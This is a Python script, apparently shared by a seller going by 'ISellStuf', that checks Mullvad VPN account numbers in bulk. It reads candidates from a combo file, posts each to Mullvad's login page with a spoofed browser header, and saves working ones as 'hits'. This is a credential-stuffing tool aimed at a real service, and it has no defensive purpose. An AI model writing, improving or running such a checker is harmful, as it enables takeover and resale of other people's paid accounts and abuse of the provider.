import os
try:
    import requests, time
    from colorama import Fore, Back, Style
except ModuleNotFoundError:
    print("[!] Some Modules Were Not Found")
    os.system('pip install requests')
    os.system("pip install colorama")
    os.system("pip install time")
    from colorama import Fore,Back,Style

    print(Fore.CYAN + "[+] Modules Installed")
    time.sleep(1)
space = print()
space

print(Fore.CYAN + """
     __  __       _ _                _    _____ _               _             
    |  \/  |     | | |              | |  / ____| |             | |            
    | \  / |_   _| | |_   ____ _  __| | | |    | |__   ___  ___| | _____ _ __ 
    | |\/| | | | | | \ \ / / _` |/ _` | | |    | '_ \ / _ \/ __| |/ / _ \ '__|
    | |  | | |_| | | |\ V / (_| | (_| | | |____| | | |  __/ (__|   <  __/ |   
    |_|  |_|\__,_|_|_| \_/ \__,_|\__,_|  \_____|_| |_|\___|\___|_|\_\___|_|   
          Version 1.1

      1.Proxyless Version
      2.Normal Version (Coming Soon...)                                                                  
      3.Exit
                                                                          """)

op = input(Fore.CYAN + "\n > ")
if op == '3':
    print(Fore.RED + "[+] Closing...")
    time.sleep(1.5)
elif op == '2':
    print(Fore.RED + "[!] In Development")
    space
    print(Fore.RED + "[+] Closing...")
    time.sleep(1.5)

if op == '1':
    print(Fore.CYAN + "[+] Starting Checker....")
    def login(num):
        
        time.sleep(0.7)
        url = 'https://mullvad.net/en/account/login'
        headers = {
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Origin':'https://mullvad.net',
            'Referer':'https://mullvad.net/en/account/login',
        }
        payload = {'account_number': f'{num}'}
        
        r = requests.post(url, headers=headers, data=payload)
        if r.status_code == 429:
            print(Fore.YELLOW + "[!] Rate Limited")
        elif "redirect" in r.text:
            print(Fore.GREEN + f"[+] Hit: {num}")
            hits = open('hits.txt','a')
            hits.write(f"[Hit]: {num} | Checker Made By ISellStuf\n")
        else:
            print(Fore.RED + f"[!] Invalid Number: {num}")
    input("Hits Were Sent To Hits.txt....")
    file = open('combo.txt','r').readlines()
    for i in file:
        seq = i.strip()
        acc = seq.split(' ')
        login(acc[0])
